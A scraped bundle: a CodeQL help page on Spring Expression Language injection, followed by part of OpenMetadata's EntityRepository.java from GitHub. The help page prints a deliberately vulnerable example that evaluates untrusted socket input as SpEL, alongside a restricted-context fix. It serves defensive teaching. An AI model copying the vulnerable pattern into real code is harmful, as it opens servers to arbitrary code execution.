  + [Wait on condition](../java-wait-on-condition-interface/)
  + [Whitespace contradicts operator precedence](../java-whitespace-contradicts-precedence/)
  + [Wrong NaN comparison](../java-comparison-with-nan/)
  + [XPath injection](../java-xml-xpath-injection/)
  + [XSLT transformation with user-controlled stylesheet](../java-xslt-injection/)
  + [`TrustManager` that accepts all certificates](../java-insecure-trustmanager/)
  + [notify instead of notifyAll](../java-notify-instead-of-notify-all/)
* [CodeQL query help for JavaScript and TypeScript](../../javascript/)
* [CodeQL query help for Python](../../python/)
* [CodeQL query help for Ruby](../../ruby/)
* [CodeQL query help for Swift](../../swift/)
* [CodeQL CWE coverage](../../codeql-cwe-coverage/)

* [CodeQL query help documentation](../../) »
* [CodeQL query help for Java and Kotlin](../) »

# Expression language injection (Spring)[¶](#expression-language-injection-spring "Link to this heading")

```
ID: java/spel-expression-injection
Kind: path-problem
Security severity: 9.3
Severity: error
Precision: high
Tags:
   - security
   - external/cwe/cwe-094
Query suites:
   - java-code-scanning.qls
   - java-security-extended.qls
   - java-security-and-quality.qls

```

[Click to see the query in the CodeQL repository](https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-094/SpelInjection.ql)

The Spring Expression Language (SpEL) is a powerful expression language provided by the Spring Framework. The language offers many features including invocation of methods available in the JVM. If a SpEL expression is built using attacker-controlled data, and then evaluated in a powerful context, then it may allow the attacker to run arbitrary code.

The `SpelExpressionParser` class parses a SpEL expression string and returns an `Expression` instance that can be then evaluated by calling one of its methods. By default, an expression is evaluated in a powerful `StandardEvaluationContext` that allows the expression to access other methods available in the JVM.

## Recommendation[¶](#recommendation "Link to this heading")

In general, including user input in a SpEL expression should be avoided. If user input must be included in the expression, it should be then evaluated in a limited context that doesn’t allow arbitrary method invocation.

## Example[¶](#example "Link to this heading")

The following example uses untrusted data to build a SpEL expression and then runs it in the default powerful context.

```
public Object evaluate(Socket socket) throws IOException {
  try (BufferedReader reader = new BufferedReader(
      new InputStreamReader(socket.getInputStream()))) {

    String string = reader.readLine();
    ExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(string);
    return expression.getValue();
  }
}

```

The next example shows how an untrusted SpEL expression can be run in `SimpleEvaluationContext` that doesn’t allow accessing arbitrary methods. However, it’s recommended to avoid using untrusted input in SpEL expressions.

```
public Object evaluate(Socket socket) throws IOException {
  try (BufferedReader reader = new BufferedReader(
      new InputStreamReader(socket.getInputStream()))) {

    String string = reader.readLine();
    ExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(string);
    SimpleEvaluationContext context
        = SimpleEvaluationContext.forReadWriteDataBinding().build();
    return expression.getValue(context);
  }
}

```

## References[¶](#references "Link to this heading")

* Spring Framework Reference Documentation: [Spring Expression Language (SpEL)](https://docs.spring.io/spring/docs/4.2.x/spring-framework-reference/html/expressions.html).
* OWASP: [Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection).
* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).

* ©
   GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)



=== Content from github.com_e00870bd_20250111_083558.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fb6b337e09a05101506a5faba4b45d370cc3c9fc8%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fjdbi3%2FEntityRepository.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fb6b337e09a05101506a5faba4b45d370cc3c9fc8%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fjdbi3%2FEntityRepository.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=open-metadata%2FOpenMetadata)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-metadata](/open-metadata)
/
**[OpenMetadata](/open-metadata/OpenMetadata)**
Public

* [Notifications](/login?return_to=%2Fopen-metadata%2FOpenMetadata) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)
* [Star
   5.9k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)

* [Code](/open-metadata/OpenMetadata)
* [Issues
  395](/open-metadata/OpenMetadata/issues)
* [Pull requests
  92](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects
  0](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

Additional navigation options

* [Code](/open-metadata/OpenMetadata)
* [Issues](/open-metadata/OpenMetadata/issues)
* [Pull requests](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

## Files

 b6b337e
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[jdbi3](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3)
/
# EntityRepository.java

Copy path Blame  Blame
## Latest commit

## History

[History](/open-metadata/OpenMetadata/commits/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java)2651 lines (2366 loc) · 110 KB b6b337e
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[jdbi3](/open-metadata/OpenMetadata/tree/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3)
/
# EntityRepository.java

Top
## File metadata and controls

* Code
* Blame

2651 lines (2366 loc) · 110 KB[Raw](https://github.com/open-metadata/OpenMetadata/raw/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000/\* \* Copyright 2021 Collate \* Licensed under the Apache License, Version 2.0 (the "License"); \* you may not use this file except in compliance with the License. \* You may obtain a copy of the License at \* http://www.apache.org/licenses/LICENSE-2.0 \* Unless required by applicable law or agreed to in writing, software \* distributed under the License is distributed on an "AS IS" BASIS, \* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \* See the License for the specific language governing permissions and \* limitations under the License. \*/
package org.openmetadata.service.jdbi3;
import static org.openmetadata.common.utils.CommonUtil.listOrEmpty;import static org.openmetadata.common.utils.CommonUtil.nullOrEmpty;import static org.openmetadata.schema.type.Include.ALL;import static org.openmetadata.schema.type.Include.DELETED;import static org.openmetadata.schema.type.Include.NON\_DELETED;import static org.openmetadata.schema.utils.EntityInterfaceUtil.quoteName;import static org.openmetadata.service.Entity.ADMIN\_USER\_NAME;import static org.openmetadata.service.Entity.DATA\_PRODUCT;import static org.openmetadata.service.Entity.DOMAIN;import static org.openmetadata.service.Entity.FIELD\_CHILDREN;import static org.openmetadata.service.Entity.FIELD\_DATA\_PRODUCTS;import static org.openmetadata.service.Entity.FIELD\_DELETED;import static org.openmetadata.service.Entity.FIELD\_DESCRIPTION;import static org.openmetadata.service.Entity.FIELD\_DISPLAY\_NAME;import static org.openmetadata.service.Entity.FIELD\_DOMAIN;import static org.openmetadata.service.Entity.FIELD\_EXPERTS;import static org.openmetadata.service.Entity.FIELD\_EXTENSION;import static org.openmetadata.service.Entity.FIELD\_FOLLOWERS;import static org.openmetadata.service.Entity.FIELD\_LIFE\_CYCLE;import static org.openmetadata.service.Entity.FIELD\_OWNER;import static org.openmetadata.service.Entity.FIELD\_REVIEWERS;import static org.openmetadata.service.Entity.FIELD\_STYLE;import static org.openmetadata.service.Entity.FIELD\_TAGS;import static org.openmetadata.service.Entity.FIELD\_VOTES;import static org.openmetadata.service.Entity.USER;import static org.openmetadata.service.Entity.getEntityByName;import static org.openmetadata.service.Entity.getEntityFields;import static org.openmetadata.service.exception.CatalogExceptionMessage.csvNotSupported;import static org.openmetadata.service.exception.CatalogExceptionMessage.entityNotFound;import static org.openmetadata.service.util.EntityUtil.compareTagLabel;import static org.openmetadata.service.util.EntityUtil.entityReferenceMatch;import static org.openmetadata.service.util.EntityUtil.fieldAdded;import static org.openmetadata.service.util.EntityUtil.fieldDeleted;import static org.openmetadata.service.util.EntityUtil.fieldUpdated;import static org.openmetadata.service.util.EntityUtil.getColumnField;import static org.openmetadata.service.util.EntityUtil.getEntityReferences;import static org.openmetadata.service.util.EntityUtil.getExtensionField;import static org.openmetadata.service.util.EntityUtil.getId;import static org.openmetadata.service.util.EntityUtil.nextMajorVersion;import static org.openmetadata.service.util.EntityUtil.nextVersion;import static org.openmetadata.service.util.EntityUtil.objectMatch;import static org.openmetadata.service.util.EntityUtil.tagLabelMatch;
import com.fasterxml.jackson.databind.JsonNode;import com.fasterxml.jackson.databind.node.ObjectNode;import com.google.common.annotations.VisibleForTesting;import com.google.common.cache.CacheBuilder;import com.google.common.cache.CacheLoader;import com.google.common.cache.LoadingCache;import com.google.common.util.concurrent.UncheckedExecutionException;import com.networknt.schema.JsonSchema;import com.networknt.schema.ValidationMessage;import java.io.IOException;import java.net.URI;import java.util.ArrayList;import java.util.Collections;import java.util.HashMap;import java.util.HashSet;import java.util.Iterator;import java.util.List;import java.util.Map;import java.util.Map.Entry;import java.util.Objects;import java.util.Optional;import java.util.Set;import java.util.UUID;import java.util.concurrent.ExecutionException;import java.util.concurrent.TimeUnit;import java.util.function.BiPredicate;import java.util.function.Function;import java.util.stream.Collectors;import javax.json.JsonPatch;import javax.validation.constraints.NotNull;import javax.ws.rs.core.Response.Status;import javax.ws.rs.core.UriInfo;import lombok.Getter;import lombok.NonNull;import lombok.extern.slf4j.Slf4j;import org.apache.commons.lang3.tuple.ImmutablePair;import org.apache.commons.lang3.tuple.Pair;import org.jdbi.v3.sqlobject.transaction.Transaction;import org.openmetadata.common.utils.CommonUtil;import org.openmetadata.schema.CreateEntity;import org.openmetadata.schema.EntityInterface;import org.openmetadata.schema.api.VoteRequest;import org.openmetadata.schema.api.VoteRequest.VoteType;import org.openmetadata.schema.api.feed.ResolveTask;import org.openmetadata.schema.api.teams.CreateTeam;import org.openmetadata.schema.entity.data.Table;import org.openmetadata.schema.entity.teams.Team;import org.openmetadata.schema.entity.teams.User;import org.openmetadata.schema.type.ChangeDescription;import org.openmetadata.schema.type.ChangeEvent;import org.openmetadata.schema.type.Column;import org.openmetadata.schema.type.EntityHistory;import org.openmetadata.schema.type.EntityReference;import org.openmetadata.schema.type.EventType;import org.openmetadata.schema.type.Include;import org.openmetadata.schema.type.LifeCycle;import org.openmetadata.schema.type.ProviderType;import org.openmetadata.schema.type.Relationship;import org.openmetadata.schema.type.TagLabel;import org.openmetadata.schema.type.TaskType;import org.openmetadata.schema.type.ThreadType;import org.openmetadata.schema.type.Votes;import org.openmetadata.schema.type.csv.CsvImportResult;import org.openmetadata.schema.utils.EntityInterfaceUtil;import org.openmetadata.service.Entity;import org.openmetadata.service.OpenMetadataApplicationConfig;import org.openmetadata.service.TypeRegistry;import org.openmetadata.service.exception.CatalogExceptionMessage;import org.openmetadata.service.exception.EntityNotFoundException;import org.openmetadata.service.exception.UnhandledServerException;import org.openmetadata.service.jdbi3.CollectionDAO.EntityRelationshipRecord;import org.openmetadata.service.jdbi3.CollectionDAO.EntityVersionPair;import org.openmetadata.service.jdbi3.CollectionDAO.ExtensionRecord;import org.openmetadata.service.jdbi3.FeedRepository.TaskWorkflow;import org.openmetadata.service.jdbi3.FeedRepository.ThreadContext;import org.openmetadata.service.resources.tags.TagLabelUtil;import org.openmetadata.service.search.SearchRepository;import org.openmetadata.service.util.EntityUtil;import org.openmetadata.service.util.EntityUtil.Fields;import org.openmetadata.service.util.FullyQualifiedName;import org.openmetadata.service.util.JsonUtils;import org.openmetadata.service.util.RestUtil;import org.openmetadata.service.util.RestUtil.DeleteResponse;import org.openmetadata.service.util.RestUtil.PatchResponse;import org.openmetadata.service.util.RestUtil.PutResponse;import org.openmetadata.service.util.ResultList;
/\*\* \* This is the base class used by Entity Resources to perform READ and WRITE operations to the backend database to \* Create, Retrieve, Update, and Delete entities. \* \* <p>An entity has two types of fields - `attributes` and `relationships`. \* \* <ul> \* <li>The `attributes` are the core properties of the entity, example - entity id, name, fullyQualifiedName, columns \* for a table, etc. \* <li>The `relationships` are an associated between two entities, example - table belongs to a database, table has a \* tag, user owns a table, etc. All relationships are captured using {@code EntityReference}. \* </ul> \* \* Entities are stored as JSON documents in the database. Each entity is stored in a separate table and is accessed \* through a <i>Data Access Object</i> or <i>DAO</i> that corresponds to each of the entity. For example, \* <i>table\_entity</i> is the database table used to store JSON docs corresponding to <i>table</i> entity and {@link \* org.openmetadata.service.jdbi3.CollectionDAO.TableDAO} is used as the DAO object to access the table\_entity table. \* All DAO objects for an entity are available in {@code daoCollection}. <br> \* <br> \* Relationships between entity is stored in a separate table that captures the edge - fromEntity, toEntity, and the \* relationship name <i>entity\_relationship</i> table and are supported by {@link \* org.openmetadata.service.jdbi3.CollectionDAO.EntityRelationshipDAO} DAO object. \* \* <p>JSON document of an entity stores only <i>required</i> attributes of an entity. Some attributes such as \* <i>href</i> are not stored and are created on the fly. <br> \* <br> \* Json document of an entity does not store relationships. As an example, JSON document for <i>table</i> entity does \* not store the relationship <i>database</i> which is of type <i>EntityReference</i>. This is always retrieved from the \* relationship table when required to ensure, the data stored is efficiently and consistently, and relationship \* information does not become stale. \*/@Slf4j@Repository()public abstract class EntityRepository<T extends EntityInterface> {
 public static final LoadingCache<Pair<String, String>, EntityInterface> CACHE\_WITH\_NAME = CacheBuilder.newBuilder() .maximumSize(5000) .expireAfterWrite(30, TimeUnit.SECONDS) .recordStats() .build(new EntityLoaderWithName()); public static final LoadingCache<Pair<String, UUID>, EntityInterface> CACHE\_WITH\_ID = CacheBuilder.newBuilder() .maximumSize(5000) .expireAfterWrite(30, TimeUnit.SECONDS) .recordStats() .build(new EntityLoaderWithId()); private final String collectionPath; private final Class<T> entityClass; @Getter protected final String entityType; @Getter protected final EntityDAO<T> dao; @Getter protected final CollectionDAO daoCollection; @Getter protected final SearchRepository searchRepository; @Getter protected final Set<String> allowedFields; public final boolean supportsSoftDelete; @Getter protected final boolean supportsTags; @Getter protected final boolean supportsOwner; @Getter protected final boolean supportsStyle; @Getter protected final boolean supportsLifeCycle; protected final boolean supportsFollower; protected final boolean supportsExtension; protected final boolean supportsVotes; @Getter protected final boolean supportsDomain; protected final boolean supportsDataProducts; @Getter protected final boolean supportsReviewers; @Getter protected final boolean supportsExperts; protected boolean quoteFqn = false; // Entity FQNS not hierarchical such user, teams, services need to be quoted protected boolean renameAllowed = false; // Entity can be renamed
 /\*\* Fields that can be updated during PATCH operation \*/ @Getter private final Fields patchFields;
 /\*\* Fields that can be updated during PUT operation \*/ @Getter protected final Fields putFields;
 protected boolean supportsSearch = false;
 protected EntityRepository( String collectionPath, String entityType, Class<T> entityClass, EntityDAO<T> entityDAO, String patchFields, String putFields) { this.collectionPath = collectionPath; this.entityClass = entityClass; allowedFields = getEntityFields(entityClass); this.dao = entityDAO; this.daoCollection = Entity.getCollectionDAO(); this.searchRepository = Entity.getSearchRepository(); this.entityType = entityType; this.patchFields = getFields(patchFields); this.putFields = getFields(putFields);
 this.supportsTags = allowedFields.contains(FIELD\_TAGS); if (supportsTags) { this.patchFields.addField(allowedFields, FIELD\_TAGS); this.putFields.addField(allowedFields, FIELD\_TAGS); } this.supportsOwner = allowedFields.contains(FIELD\_OWNER); if (supportsOwner) { this.patchFields.addField(allowedFields, FIELD\_OWNER); this.putFields.addField(allowedFields, FIELD\_OWNER); } this.supportsSoftDelete = allowedFields.contains(FIELD\_DELETED); this.supportsFollower = allowedFields.contains(FIELD\_FOLLOWERS); if (supportsFollower) { this.patchFields.addField(allowedFields, FIELD\_FOLLOWERS); this.putFields.addField(allowedFields, FIELD\_FOLLOWERS); } this.supportsExtension = allowedFields.contains(FIELD\_EXTENSION); if (supportsExtension) { this.patchFields.addField(allowedFields, FIELD\_EXTENSION); this.putFields.addField(allowedFields, FIELD\_EXTENSION); } this.supportsVotes = allowedFields.contains(FIELD\_VOTES); if (supportsVotes) { this.patchFields.addField(allowedFields, FIELD\_VOTES); this.putFields.addField(allowedFields, FIELD\_VOTES); } this.supportsDomain = allowedFields.contains(FIELD\_DOMAIN); if (supportsDomain) { this.patchFields.addField(allowedFields, FIELD\_DOMAIN); this.putFields.addField(allowedFields, FIELD\_DOMAIN); } this.supportsReviewers = allowedFields.contains(FIELD\_REVIEWERS); if (supportsReviewers) { this.patchFields.addField(allowedFields, FIELD\_REVIEWERS); this.putFields.addField(allowedFields, FIELD\_REVIEWERS); } this.supportsExperts = allowedFields.contains(FIELD\_EXPERTS); if (supportsExperts) { this.patchFields.addField(allowedFields, FIELD\_EXPERTS); this.putFields.addField(allowedFields, FIELD\_EXPERTS); } this.supportsDataProducts = allowedFields.contains(FIELD\_DATA\_PRODUCTS); if (supportsDataProducts) { this.patchFields.addField(allowedFields, FIELD\_DATA\_PRODUCTS); this.putFields.addField(allowedFields, FIELD\_DATA\_PRODUCTS); } this.supportsStyle = allowedFields.contains(FIELD\_STYLE); if (supportsStyle) { this.patchFields.addField(allowedFields, FIELD\_STYLE); this.putFields.addField(allowedFields, FIELD\_STYLE); } this.supportsLifeCycle = allowedFields.contains(FIELD\_LIFE\_CYCLE); if (supportsLifeCycle) { this.patchFields.addField(allowedFields, FIELD\_LIFE\_CYCLE); this.putFields.addField(allowedFields, FIELD\_LIFE\_CYCLE); } Entity.registerEntity(entityClass, entityType, this); }
 /\*\* \* Set the requested fields in an entity. This is used for requesting specific fields in the object during GET \* operations. It is also used during PUT and PATCH operations to set up fields that can be updated. \*/ public abstract void setFields(T entity, Fields fields);
 /\*\* \* Set the requested fields in an entity. This is used for requesting specific fields in the object during GET \* operations. It is also used during PUT and PATCH operations to set up fields that can be updated. \*/ public abstract void clearFields(T entity, Fields fields);
 /\*\* \* This method is used for validating an entity to be created during POST, PUT, and PATCH operations and prepare the \* entity with all the required attributes and relationships. \* \* <p>The implementation of this method must perform the following: \* \* <ol> \* <li>Prepare the values for attributes that are not required in the request but can be derived on the server side. \* Example - <i>>FullyQualifiedNames</i> of an entity can be derived from the hierarchy that an entity belongs \* to . \* <li>Validate all the attributes of an entity. \* <li>Validate all the relationships of an entity. As an example - during <i>table</i> creation, relationships such \* as <i>Tags</i>, <i>Owner</i>, <i>Database</i>a table belongs to are validated. During validation additional \* information that is not required in the create/update request are set up in the corresponding relationship \* fields. \* </ol> \* \* At the end of this operation, entity is expected to be valid and fully constructed with all the fields that will be \* sent as payload in the POST, PUT, and PATCH operations response. \* \* @see TableRepository#prepare(Table, boolean) for an example implementation \*/ public abstract void prepare(T entity, boolean update);
 /\*\* \* An entity is stored in the backend database as JSON document. The JSON includes some attributes of the entity and \* does not include attributes such as <i>href</i>. The relationship fields of an entity is never stored in the JSON \* document. It is always reconstructed based on relationship edges from the backend database. <br> \* <br> \* As an example, when <i>table</i> entity is stored, the attributes such as <i>href</i> and the relationships such as \* <i>owner</i>, <i>database</i>, and <i>tags</i> are set to null. These attributes are restored back after the JSON \* document is stored to be sent as response. \* \* @see TableRepository#storeEntity(Table, boolean) for an example implementation \*/ public abstract void storeEntity(T entity, boolean update);
 /\*\* \* This method is called to store all the relationships of an entity. It is expected that all relationships are \* already validated and completely setup before this method is called and no validation of relationships is required. \* \* @see TableRepository#storeRelationships(Table) for an example implementation \*/ public abstract void storeRelationships(T entity);
 /\*\* \* This method is called to set inherited fields that an entity inherits from its parent. \* \* @see TableRepository#setInheritedFields(Table, Fields) for an example implementation \*/ @SuppressWarnings("unused") public T setInheritedFields(T entity, Fields fields) { EntityInterface parent = supportsDomain ? getParentEntity(entity, "domain") : null; return parent != null ? inheritDomain(entity, fields, parent) : entity; }
 /\*\* \* PATCH operations can't overwrite certain fields, such as entity ID, fullyQualifiedNames etc. Instead of throwing an \* error, we take lenient approach of ignoring the user error and restore those attributes based on what is already \* stored in the original entity. \*/ public void restorePatchAttributes(T original, T updated) { updated.setId(original.getId()); updated.setName(renameAllowed ? updated.getName() : original.getName()); updated.setFullyQualifiedName(original.getFullyQualifiedName()); updated.setChangeDescription(original.getChangeDescription()); }
 /\*\* Set fullyQualifiedName of an entity \*/ public void setFullyQualifiedName(T entity) { entity.setFullyQualifiedName(quoteName(entity.getName())); }
 /\*\* \* Initialize data from json files if seed data does not exist in corresponding tables. Seed data is stored under \* openmetadata-service/src/main/resources/json/data/{entityType} \* \* <p>This method needs to be explicitly called, typically from initialize method. See {@link \* org.openmetadata.service.resources.teams.RoleResource#initialize(OpenMetadataApplicationConfig)} \*/ public void initSeedDataFromResources() throws IOException { List<T> entities = getEntitiesFromSeedData(); for (T entity : entities) { initializeEntity(entity); } }
 public List<T> getEntitiesFromSeedData() throws IOException { return getEntitiesFromSeedData(String.format(".\*json/data/%s/.\*\\.json$", entityType)); }
 public List<T> getEntitiesFromSeedData(String path) throws IOException { return getEntitiesFromSeedData(entityType, path, entityClass); }
 public static <U> List<U> getEntitiesFromSeedData(String entityType, String path, Class<U> clazz) throws IOException { List<U> entities = new ArrayList<>(); List<String> jsonDataFiles = EntityUtil.getJsonDataResources(path); jsonDataFiles.forEach( jsonDataFile -> { try { String json = CommonUtil.getResourceAsStream(EntityRepository.class.getClassLoader(), jsonDataFile); json = json.replace("<separator>", Entity.SEPARATOR); entities.add(JsonUtils.readValue(json, clazz)); } catch (Exception e) { LOG.warn("Failed to initialize the {} from file {}", entityType, jsonDataFile, e); } }); return entities; }
 /\*\* Initialize a given entity if it does not exist. \*/ @Transaction public void initializeEntity(T entity) { T existingEntity = findByNameOrNull(entity.getFullyQualifiedName(), ALL); if (existingEntity != null) { LOG.info("{} {} is already initialized", entityType, entity.getFullyQualifiedName()); return; }
 LOG.info("{} {} is not initialized", entityType, entity.getFullyQualifiedName()); entity.setUpdatedBy(ADMIN\_USER\_NAME); entity.setUpdatedAt(System.currentTimeMillis()); entity.setId(UUID.randomUUID()); create(null, entity); LOG.info("Created a new {} {}", entityType, entity.getFullyQualifiedName()); }
